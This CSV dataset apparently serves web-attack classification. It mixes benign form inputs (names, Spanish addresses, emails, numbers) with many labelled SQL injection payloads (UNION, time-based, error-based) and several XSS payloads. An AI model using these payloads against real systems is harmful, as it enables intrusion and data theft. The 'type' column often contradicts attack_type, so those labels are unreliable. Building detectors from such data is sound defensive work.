Text,attack_type,Label,type
mccurdy,norm,0,normal
"1"");select (case when (4415=2051) then 4415 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
carmnea,norm,0,normal
sandberg@3horas.tl,norm,0,normal
-3246%' union all select 4012#,sqli,1,sql
marcum3,norm,0,normal
07995079a,norm,0,normal
"-3822"")) as dftp where 2817=2817 union all select 2817,2817,2817,2817,2817,2817#",sqli,1,sql
"-7491"") as cnrn where 3635=3635 order by 1#",sqli,1,normal
-8045))) order by 1--,sqli,1,sql
michiel,norm,0,normal
1)) as trin where 8843=8843;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
"1 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
kurio,norm,0,normal
26t9g71,norm,0,normal
rey,norm,0,normal
kalila,norm,0,normal
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'gbpg'='gbpg",sqli,1,normal
ladronzue_lo,norm,0,normal
1%');select (case when (6434=3877) then 6434 else 1/(select 0) end)--,sqli,1,sql
"1) as jdhz where 2021=2021;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"calle congreso 7, 11?c",norm,0,normal
(case when 8422=8452 then 1 else null end),sqli,1,normal
vincents,norm,0,normal
1' and 9198=9198--,sqli,1,sql
ibarra,norm,0,normal
86168713h,norm,0,normal
"1%""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""%""=""",sqli,1,sql
moriyama,norm,0,normal
"1%"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""%""=""",sqli,1,sql
rydberg@pavimentosalagon.vn,norm,0,normal
"1"") union all select null,null,null,null#",sqli,1,sql
-9103' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'nlvq'='nlvq,sqli,1,sql
erwin,norm,0,normal
1%'))) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
09621588k,norm,0,normal
"1')));select count(*) from generate_series(1,5000000)--",sqli,1,sql
1')) as wqhm where 9871=9871;(select * from (select(sleep(5)))srmq)--,sqli,1,sql
"-6335""))) union all select 3654--",sqli,1,sql
3499,norm,0,normal
37216,norm,0,normal
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ukzb'='ukzb,sqli,1,sql
"1%""))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1%"")));select (case when (4996=1734) then 1 else 4996*(select 4996 from master..sysdatabases) end)--",sqli,1,sql
33776,norm,0,normal
derwin,norm,0,normal
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",sqli,1,sql
"alcalde baeza medina, s/n,",norm,0,normal
1' in boolean mode);begin dbms_lock.sleep(5); end#,sqli,1,sql
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""bkoq""=""bkoq",sqli,1,normal
cabanillas de la sierra,norm,0,normal
mcfarlan,norm,0,normal
8838380607178464,norm,0,normal
1'+(select iowv where 6105=6105 and sleep(5)#,sqli,1,sql
"-5182"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
99631010r,norm,0,normal
cigea,norm,0,normal
34338,norm,0,normal
23865566f,norm,0,normal
"c/ valtravieso s/n,",norm,0,normal
"1 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
tarsky,norm,0,normal
0lica,norm,0,normal
"-7448 union all select 4072,4072#",sqli,1,sql
salter@quiromante.com.mg,norm,0,normal
hu1garina,norm,0,normal
lischyns,norm,0,normal
14li6l4,norm,0,normal
37ce,norm,0,normal
859,norm,0,normal
"1%')) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
6969218840353038,norm,0,normal
1889610781907232,norm,0,normal
40139732v,norm,0,normal
fisterra,norm,0,normal
iber,norm,0,normal
03248i367ca,norm,0,normal
3242091278649247,norm,0,normal
"1%'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='",sqli,1,sql
"1)) as fqee where 3286=3286;select count(*) from generate_series(1,5000000)--",sqli,1,sql
6913071576619939,norm,0,normal
"1) as mwcs where 2544=2544 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
"1"")) as tncm where 8203=8203 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
2499149169058216,norm,0,normal
-4384'))) or 6872=6872 and ((('ukhl'='ukhl,sqli,1,normal
3539419158271932,norm,0,normal
8729606554712430,norm,0,normal
kaz@3horas.com,norm,0,normal
calle jeremias 14 7b,norm,0,normal
45681,norm,0,normal
85022940j,norm,0,normal
"1) where 1185=1185 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
baco,norm,0,normal
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc",sqli,1,sql
"-3361 where 1335=1335 or elt(5891=5092,5092)--",sqli,1,sql
de la barca pitti,norm,0,normal
3661940651728423,norm,0,normal
"1"")) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
rubor,norm,0,normal
repraz torrubiano,norm,0,normal
dalila,norm,0,normal
"-8580') union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",sqli,1,sql
batllori budi,norm,0,normal
9182,norm,0,normal
ruidera,norm,0,normal
"calle la orotava, s/n",norm,0,normal
"1"") as gjlv where 1983=1983 and sleep(5)#",sqli,1,normal
06196,norm,0,normal
"c/ comedias, 109,",norm,0,normal
"-9011"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""yobb"" like ""yobb",sqli,1,sql
pontevedra,norm,0,normal
4963506739861376,norm,0,normal
"1"" where 8978=8978 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
zabalza,norm,0,normal
45908,norm,0,normal
oficios$o,norm,0,normal
"1%""));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
aldebar,norm,0,normal
1;(select * from (select(sleep(5)))srmq)-- mmjk,sqli,1,sql
kilgarrif@universla.cg,norm,0,normal
0n9ped7,norm,0,normal
bar7ech7r5,norm,0,normal
ratcliffe@921.uk,norm,0,normal
"plaa de margarida xirgu 141, 2h",norm,0,normal
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1%' and make_set(1227=5627,5627) and '%'='",sqli,1,normal
"c/ luis braille 2, 10d",norm,0,normal
sanandreu agramunt,norm,0,normal
ddimo,norm,0,normal
49210905j,norm,0,normal
zool7ic1,norm,0,normal
"1' in boolean mode) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",sqli,1,sql
pardinas odremn,norm,0,normal
"-9557) where 2891=2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",sqli,1,sql
8511359548446745,norm,0,normal
""";alert('xss');//",xss,2,sql
valdeolivas,norm,0,normal
"1)) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((3102=3102",sqli,1,sql
cardias,norm,0,normal
56876281h,norm,0,normal
3636718261546476,norm,0,normal
1pergamin0da,norm,0,normal
6aq408tro,norm,0,normal
"-8349) union all select 8126,8126#",sqli,1,sql
7058252446193830,norm,0,normal
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",sqli,1,sql
289,norm,0,normal
05496401e,norm,0,normal
1%');select (case when (9986=8342) then 9986 else 9986*(select 9986 from information_schema.character_sets) end)#,sqli,1,sql
"-9408%"")) union all select 1841,1841,1841,1841,1841,1841--",sqli,1,sql
fililberto,norm,0,normal
$embrutecimiento,norm,0,normal
maynez giovannetti,norm,0,normal
4650446572677289,norm,0,normal
4617331244727589,norm,0,normal
7709760846022131,norm,0,normal
"calle pablo penaguilas, 112, 7?a",norm,0,normal
technoso,norm,0,normal
ekezian-wohlfeiler@cirugiaalbeiteria.lv,norm,0,normal
sfiroudi,norm,0,normal
grodecki,norm,0,normal
"1) where 2678=2678 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1%'));select count(*) from generate_series(1,5000000)--",sqli,1,sql
pires arajol,norm,0,normal
"c/ tomillar, 54, 1-e",norm,0,normal
06226784v,norm,0,normal
"1""))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((""tabq"" like ""tabq",sqli,1,normal
burns40,norm,0,normal
1) as tykp where 6851=6851;waitfor delay '0:0:5'--,sqli,1,sql
"1%' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",sqli,1,normal
cas,norm,0,normal
1'||(select 'jslz' where 8405=8405 rlike (select * from (select(sleep(5)))sgvo))||',sqli,1,sql
despamplonar,norm,0,normal
masferr massans,norm,0,normal
lage lloris,norm,0,normal
"-9688%'))) or elt(3695=7995,7995) and ((('%'='",sqli,1,normal
"1""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""obau""=""obau",sqli,1,sql
25182,norm,0,normal
vilca llora,norm,0,normal
remante,norm,0,normal
perpiny romero,norm,0,normal
lebrillo,norm,0,normal
cantalejo,norm,0,normal
"1'||(select 'xhqy' where 4531=4531 union all select null,null--",sqli,1,sql
thomasin,norm,0,normal
"1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
hallaran@manjarr.cd,norm,0,normal
-5555)) as ldte where 4583=4583 order by 1#,sqli,1,normal
d-icotmico,norm,0,normal
1') as wpmv where 1479=1479 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
6014,norm,0,normal
cariena,norm,0,normal
"1 where 5081=5081 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
5111638071636143,norm,0,normal
0936495801431480,norm,0,normal
apolonio,norm,0,normal
"-6760 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# ikqw",sqli,1,sql
rist,norm,0,normal
"c/ padilla, 74 12h",norm,0,normal
irre2u3er6b22,norm,0,normal
piggott@firstchoicecoffee.gq,norm,0,normal
"-5496 union all select 2099,2099,2099#",sqli,1,sql
"1"" where 8732=8732;begin dbms_lock.sleep(5); end--",sqli,1,sql
juli,norm,0,normal
cuad5in1m3o,norm,0,normal
malen,norm,0,normal
"-6389"" union all select 2355,2355,2355,2355,2355--",sqli,1,sql
calle cierzo 126,norm,0,normal
manda,norm,0,normal
baarova@hrmsl.mil,norm,0,normal
<script>alert('vl')</script>,xss,2,xss
"<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>",xss,2,xss
dia-edin,norm,0,normal
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""jmjr"" like ""jmjr",sqli,1,sql
"-7412"") as qngt where 2041=2041 union all select 2041--",sqli,1,sql
"1%'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('%'='",sqli,1,normal
"-9672%""))) order by 1#",sqli,1,normal
84082482w,norm,0,normal
violet@sunmiles.cf,norm,0,normal
1'+(select 'hcqf' where 9956=9956 and (2993=4297)*4297)+',sqli,1,sql
"1 where 8506=8506;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
haenning@maxitienda.be,norm,0,normal
"-5726%"")) or 6872=6872 and ((""%""=""",sqli,1,normal
nga,norm,0,normal
valma,norm,0,normal
sheara,norm,0,normal
"(convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (9339=9339) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))",sqli,1,sql
"c/ poetisa juana luna 135, 5-g",norm,0,normal
macrina,norm,0,normal
"1%"")) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
"1"" where 1537=1537 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
"1%"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
c/ santo domingo 13 10?b,norm,0,normal
"calle mateo lopez 62,",norm,0,normal
sin,norm,0,normal
cuevas de san marcos,norm,0,normal
"1"" where 1852=1852 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
cutillas,norm,0,normal
95372776x,norm,0,normal
knute,norm,0,normal
sacudir,norm,0,normal
26291,norm,0,normal
"1"") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
villalgordo del marquesado,norm,0,normal
"santa vera cruz, 21",norm,0,normal
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",sqli,1,sql
02260,norm,0,normal
objio,norm,0,normal
diccico_pastor@ao09.io,norm,0,normal
"-9601')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
panama 128 5-b,norm,0,normal
"-9859""))) union all select 6595,6595,6595,6595,6595,6595,6595#",sqli,1,sql
"1 and make_set(6911=1867,1867)",sqli,1,normal
mellvig@docerosas.sd,norm,0,normal
estafanell pujades,norm,0,normal
miravete de la sierra,norm,0,normal
1' rlike sleep(5) and 'cugs'='cugs,sqli,1,normal
"1 where 8948=8948 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
luke,norm,0,normal
marcolino,norm,0,normal
"1'||(select 'wcad' from dual where 4262=4262 and elt(3114=3114,sleep(5))#",sqli,1,sql
calle castropol 11,norm,0,normal
"isabel la catolica, 5",norm,0,normal
sile,norm,0,normal
ribot velugo,norm,0,normal
bulay vallejo,norm,0,normal
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
14139,norm,0,normal
lerumeur@phd-photodecor.sj,norm,0,normal
"1 and make_set(9542=8888,8888)-- idkn",sqli,1,sql
"1' where 5778=5778;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
1'+(select tzvm where 5145=5145 and 4192=7437#,sqli,1,sql
"carlos trivio moreno, 2,",norm,0,normal
85,norm,0,normal
"c/ juan ramon jimenez, 135, 11d",norm,0,normal
5exas9labo,norm,0,normal
alberuela de tubo,norm,0,normal
"1') where 3476=3476 and elt(1210=1210,sleep(5))--",sqli,1,sql
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('pqxe' like 'pqxe",sqli,1,sql
1')) as xirr where 2425=2425;select sleep(5)#,sqli,1,sql
6193259075510468,norm,0,normal
dido,norm,0,normal
bollullos de la mitacin,norm,0,normal
9824,norm,0,normal
petrus rosselot,norm,0,normal
trintignant.iwasaki@softgold.com.np,norm,0,normal
81451206h,norm,0,normal
"-2125"")) or 8571=8571--",sqli,1,sql
"1)) and elt(1210=1210,sleep(5)) and ((5874=5874",sqli,1,normal
"1%"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"-8950"")) as uahs where 2113=2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",sqli,1,sql
"1'+(select llcl where 8188=8188 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
cicek0,norm,0,normal
"-9978"" or make_set(4893=9765,9765) and ""mhjt""=""mhjt",sqli,1,normal
marbella,norm,0,normal
1) waitfor delay '0:0:5' and (2993=2993,sqli,1,normal
85981189j,norm,0,normal
50835477a,norm,0,normal
lima9za,norm,0,normal
mo3tren04,norm,0,normal
"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('crosssitescripting');"">",xss,2,xss
c9r6n0233esca,norm,0,normal
clipsham5,norm,0,normal
pavese@euskalcasino.mz,norm,0,normal
3195365184301828,norm,0,normal
"-3433') where 8307=8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--",sqli,1,sql
av. del mar cantabrico 176 6-d,norm,0,normal
97426856y,norm,0,normal
16154,norm,0,normal
"calle grevol, 123 6?a",norm,0,normal
mantegna-romney@underdog.tc,norm,0,normal
"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""onhh""=""onhh",sqli,1,normal
stephano@clinicadentalsansalvador.nf,norm,0,normal
">""<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",xss,2,xss
16471396s,norm,0,normal
"-7323%"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",sqli,1,sql
2nd2y19i78b4e,norm,0,normal
9e6e3illa,norm,0,normal
torrija,norm,0,normal
17486,norm,0,normal
">""<iframe src=http://vulnerability-lab.com/>@gmail.com",xss,2,normal
ochagava/otsagabia,norm,0,normal
eficientemente,norm,0,normal
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (1435=1435",sqli,1,sql
purgerso1,norm,0,normal
8374f09a2,norm,0,normal
"-3794') union all select 2485,2485,2485,2485,2485--",sqli,1,sql
fryar,norm,0,normal
8622247853302054,norm,0,normal
-1796') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lpuw' like 'lpuw,sqli,1,sql
andrzej,norm,0,normal
sinclair@campanasextractoras.lc,norm,0,normal
"calle udal hilerria, 11, 11?d",norm,0,normal
feridad,norm,0,normal
benjavan,norm,0,normal
czapka rada,norm,0,normal
"<meta http-equiv=""link"" content=""<http://vulnerability-lab.com/crosssitescripting.css>; rel=stylesheet"">",xss,2,sql
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
6986219017290364,norm,0,normal
baxley@italianmotorvillagesevilla.sh,norm,0,normal
506ca,norm,0,normal
ejerci78,norm,0,normal
padral gracida,norm,0,normal
vaca sols,norm,0,normal
hormilla,norm,0,normal
arteta,norm,0,normal
9036735261224878,norm,0,normal
3803,norm,0,normal
"-6475""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""mdsx"" like ""mdsx",sqli,1,sql
"calle manco, 109, 10-g",norm,0,normal
47450,norm,0,normal
3789354491351928,norm,0,normal
badolatosa,norm,0,normal
25449,norm,0,normal
"<img src="" javascript:document.cookie=true;"">",xss,2,xss
colin,norm,0,normal
41628831g,norm,0,normal
1'||(select 'dfmw' from dual where 1723=1723;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
p5nderativa,norm,0,normal
1'||(select 'nwve' where 7721=7721;begin user_lock.sleep(5); end--,sqli,1,sql
"1',(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(9693=9693,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
cceres,norm,0,normal
krautle,norm,0,normal
acurio bayona,norm,0,normal
1) as mixt where 1085=1085 or sleep(5)--,sqli,1,sql
"1) union all select null,null,null#",sqli,1,sql
-3880) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (5194=5194,sqli,1,sql
4474255756033041,norm,0,normal
8744,norm,0,normal
1') and (1471=7892)*7892 and ('kkok' like 'kkok,sqli,1,normal
"1%"") union all select null,null--",sqli,1,sql
"1)) as qfnu where 1609=1609 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1%"" union all select null,null,null,null,null,null--",sqli,1,sql
37755,norm,0,normal
claudio,norm,0,normal
15785527y,norm,0,normal
"1"")) as drss where 2077=2077 and 7533=7533--",sqli,1,sql
"1"")));select sleep(5)#",sqli,1,sql
62955100y,norm,0,normal
29850288z,norm,0,normal
"-7271'))) or make_set(9354=9354,7185) and ((('mdtw'='mdtw",sqli,1,normal
ocallaghan@asyra.li,norm,0,normal
7559,norm,0,normal
thordsen@guejos.sy,norm,0,normal
71814891j,norm,0,normal
"1) where 8375=8375;select * from generate_series(6468,6468,case when (6468=7999) then 1 else 0 end) limit 1--",sqli,1,sql
"1')) as egsj where 3447=3447;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
chiriv herrador,norm,0,normal
"1'))) and elt(4249=4249,7259) and ((('kgdt' like 'kgdt",sqli,1,normal
"1""))) union all select null,null,null,null--",sqli,1,sql
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",sqli,1,sql
echeverra lamiquiz,norm,0,normal
</script></script><<<<script><>>>><<<script>alert(xss)</script>,xss,2,xss
holgorio,norm,0,normal
mang,norm,0,normal
1'+(select 'ohdf' where 7878=7878 and 5678=3277--,sqli,1,sql
47511,norm,0,normal
reggis,norm,0,normal
"1) where 8691=8691 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
20739,norm,0,normal
roco daira,norm,0,normal
ap-remiadora,norm,0,normal
"1)) as xzcl where 2332=2332;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
atletismo,norm,0,normal
39100,norm,0,normal
ferreruelo,norm,0,normal
pujolaso faucheux,norm,0,normal
1?i0l,norm,0,normal
pt*rido,norm,0,normal
4347,norm,0,normal
">""<img src=""livescript:document.cookie=true;"">",xss,2,sql
sergyl@intercambiodeenlaces.gh,norm,0,normal
revelante,norm,0,normal
graydon,norm,0,normal
1) where 9307=9307;select pg_sleep(5)--,sqli,1,sql
"poblado de regulares 180, 1d",norm,0,normal
disney,norm,0,normal
rosebud,norm,0,normal
3ist423o,norm,0,normal
"1 union all select null,null,null,null,null#",sqli,1,sql
aristteles,norm,0,normal
"1"" where 7344=7344 rlike (select * from (select(sleep(5)))sgvo)--",sqli,1,sql
29540,norm,0,normal
hoss@926.yu,norm,0,normal
"1%'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('%'='",sqli,1,sql
"1'+(select mems where 5091=5091 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+'",sqli,1,sql
snerd@bwds.tj,norm,0,normal
mahonen,norm,0,normal
"1'+(select 'vwzp' where 2729=2729 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (8898=8898",sqli,1,normal
compurgar,norm,0,normal
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('dpdz' like 'dpdz",sqli,1,sql
<script>alert('xssya');</script>,xss,2,xss
suzuki,norm,0,normal
29424173c,norm,0,normal
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('mmow'='mmow,sqli,1,sql
35936056m,norm,0,normal
friedkin@dubi.ye,norm,0,normal
"1%'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"")) as aamh where 7432=7432 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
klaudt,norm,0,normal
-6015%') order by 1--,sqli,1,sql
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('pehq' like 'pehq,sqli,1,sql
clifford,norm,0,normal
54368029p,norm,0,normal
"sainz de la calleja 75,",norm,0,normal
lani,norm,0,normal
greg,norm,0,normal
17536,norm,0,normal
5706258775201783,norm,0,normal
"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (4959=4959",sqli,1,normal
3090309356427587,norm,0,normal
simplemente,norm,0,normal
-3088' or 6872=6872 and 'miwk'='miwk,sqli,1,normal
bonany lambarri,norm,0,normal
1')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
83360974g,norm,0,normal
41970,norm,0,normal
barres@engibraltar.bm,norm,0,normal
</title><script>document.cookie=true;</script>,xss,2,xss
spurway,norm,0,normal
"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",sqli,1,sql
d012965226m6ent0,norm,0,normal
09107,norm,0,normal
dueppen,norm,0,normal
1'))) rlike sleep(5) and ((('zwyx'='zwyx,sqli,1,normal
hixon,norm,0,normal
chakiris@forohh.sa,norm,0,normal
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('xhez' like 'xhez",sqli,1,sql
indagatoria,norm,0,normal
